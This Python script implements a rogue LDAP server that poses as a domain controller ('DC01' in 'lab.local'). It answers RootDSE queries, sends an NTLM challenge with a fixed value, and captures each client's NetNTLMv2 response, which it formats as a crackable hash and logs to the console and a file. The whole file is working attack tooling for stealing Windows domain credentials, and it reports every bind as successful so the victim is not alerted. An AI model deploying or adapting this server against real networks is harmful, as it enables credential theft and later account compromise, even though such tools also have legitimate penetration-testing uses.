#!/usr/bin/env python3
# Minimal LDAP server that captures NTLMSSP (NetNTLMv2) from a Negotiate/SASL bind.
# Answers anonymous RootDSE search (functional level) + NTLM Type2 challenge; logs Type3.
# WINDOWS build: LOG path is a Windows path; prints hashes live to the console.
import socket, struct, binascii, sys, time

HOST='0.0.0.0'; PORT=389
NSIG=b'NTLMSSP\x00'
CHALLENGE=b'\x11\x22\x33\x44\x55\x66\x77\x88'
LOG=r'ldapcap-win.out'
def log(m):
    line=f'[{time.strftime("%H:%M:%S")}] {m}'
    print(line, flush=True)
    open(LOG,'a').write(line+'\n')

def blen(n):
    if n<128: return bytes([n])
    b=[]
    while n: b.insert(0,n&0xff); n>>=8
    return bytes([0x80|len(b)])+bytes(b)

def msgid_of(data):
    # 0x30 <len> 02 01 <mid> ...
    if data[1]<0x80: cs=2
    else: cs=2+(data[1]&0x7f)
    # content: 02 01 MID
    if data[cs]==0x02:
        ln=data[cs+1]; return data[cs+2], data  # 1-byte mid
    return 1, data

def build_type2():
    dom='LAB'.encode('utf-16le'); comp='DC01'.encode('utf-16le')
    dns='lab.local'.encode('utf-16le'); dnsc='dc01.lab.local'.encode('utf-16le')
    def av(t,v): return struct.pack('<HH',t,len(v))+v
    avpairs=av(2,dom)+av(1,comp)+av(4,dns)+av(3,dnsc)+struct.pack('<HH',0,0)
    target=dom
    flags=0xe2898235  # +KEY_EXCH +VERSION +TARGET_INFO +TARGET_TYPE_DOMAIN +EXT_SESS ...
    fixed=56
    tn_off=fixed; ti_off=fixed+len(target)
    ver=b'\x0a\x00\x63\x45\x00\x00\x00\x0f'
    t2 =NSIG+struct.pack('<I',2)
    t2+=struct.pack('<HHI',len(target),len(target),tn_off)
    t2+=struct.pack('<I',flags)+CHALLENGE+b'\x00'*8
    t2+=struct.pack('<HHI',len(avpairs),len(avpairs),ti_off)
    t2+=ver+target+avpairs
    return t2

NTLM_OID=b'\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a'
def spnego_resp(t2):
    rt=b'\xa2'+blen(len(t2)+2)+b'\x04'+blen(len(t2))+t2
    supm=b'\xa1'+blen(len(NTLM_OID))+NTLM_OID
    inner=b'\xa0\x03\x0a\x01\x01'+supm+rt
    seq=b'\x30'+blen(len(inner))+inner
    return b'\xa1'+blen(len(seq))+seq

def bind_saslinprogress(mid,spnego):
    sasl=b'\x87'+blen(len(spnego))+spnego
    body=b'\x0a\x01\x0e\x04\x00\x04\x00'+sasl
    bindr=b'\x61'+blen(len(body))+body
    msg=b'\x02\x01'+bytes([mid])+bindr
    return b'\x30'+blen(len(msg))+msg

def bind_success(mid):
    body=b'\x0a\x01\x00\x04\x00\x04\x00'
    msg=b'\x02\x01'+bytes([mid])+b'\x61'+blen(len(body))+body
    return b'\x30'+blen(len(msg))+msg

def search_rootdse(mid):
    # searchResEntry: domainFunctionality=7 ; then searchResDone(success)
    name=b'domainFunctionality'
    pa=b'\x30'+blen(len(name)+2+2+5-0)  # placeholder recompute below
    # build cleanly
    val=b'\x31\x03\x04\x01\x37'
    attr=b'\x04'+blen(len(name))+name+val
    pa=b'\x30'+blen(len(attr))+attr
    attrs=b'\x30'+blen(len(pa))+pa
    sre=b'\x64'+blen(2+len(attrs))+b'\x04\x00'+attrs
    e=b'\x02\x01'+bytes([mid])+sre
    entry=b'\x30'+blen(len(e))+e
    dbody=b'\x0a\x01\x00\x04\x00\x04\x00'
    d=b'\x02\x01'+bytes([mid])+b'\x65'+blen(len(dbody))+dbody
    done=b'\x30'+blen(len(d))+d
    return entry+done

def parse_type3(t3):
    # NetNTLMv2 fields: user (off 36), domain (off 28), NtChallengeResponse (off 20)
    def field(off):
        ln,mx,o=struct.unpack('<HHI',t3[off:off+8]); return t3[o:o+ln],ln,o
    dom,_,_=field(28); user,_,_=field(36); nt,ntlen,nto=field(20)
    u=user.decode('utf-16le','ignore'); d=dom.decode('utf-16le','ignore')
    if ntlen>=16:
        ntproof=binascii.hexlify(nt[:16]).decode(); blob=binascii.hexlify(nt[16:]).decode()
        srvchal=binascii.hexlify(CHALLENGE).decode()
        h=f"{u}::{d}:{srvchal}:{ntproof}:{blob}"
        return u,d,h
    return u,d,None

def handle(c):
    buf=b''
    while True:
        try: data=c.recv(8192)
        except: break
        if not data: break
        buf=data
        idx=buf.find(NSIG)
        mid,_=msgid_of(buf)
        op = buf[ (2 if buf[1]<0x80 else 2+(buf[1]&0x7f)) +3 ]  # protocolOp tag
        if idx>=0:
            mtype=buf[idx+8]
            if mtype==1:
                t1=buf[idx:]
                wrapper=buf[:idx]
                is_spnego = (b'\x2b\x06\x01\x05\x05\x02' in buf[:idx])   # SPNEGO OID present => wrapped; else raw NTLM token
                mech = 'SPNEGO' if is_spnego else 'RAW/SICILY'
                log(f"NTLM Type1 mid={mid} mech={mech} wrapperBefore={binascii.hexlify(wrapper).decode()}")
                if is_spnego:
                    resp=bind_saslinprogress(mid, spnego_resp(build_type2()))
                else:
                    resp=bind_saslinprogress(mid, build_type2())   # raw Type2, no SPNEGO
                log(f"sending Type2 ({mech}, {len(resp)}B)")
                c.sendall(resp)
            elif mtype==3:
                u,d,h=parse_type3(buf[idx:])
                log(f">>> NTLM Type3 CAPTURED  user='{u}' domain='{d}'")
                if h: log(f">>> NetNTLMv2: {h}")
                c.sendall(bind_success(mid))
        elif op==0x63:  # SearchRequest -> RootDSE functional level
            log(f"Search (RootDSE) mid={mid} -> functional level")
            c.sendall(search_rootdse(mid))
        elif op==0x60:  # simple/other bind
            log(f"Bind (non-NTLM) mid={mid} -> success  raw={binascii.hexlify(buf[:40]).decode()}")
            c.sendall(bind_success(mid))
        else:
            c.sendall(bind_success(mid))

s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((HOST,PORT)); s.listen(8)
log(f"LDAP/NTLM capture listening on {HOST}:{PORT}")
while True:
    c,a=s.accept(); log(f"conn from {a}")
    try: handle(c)
    except Exception as e: log(f"err {e}")
    finally: c.close()
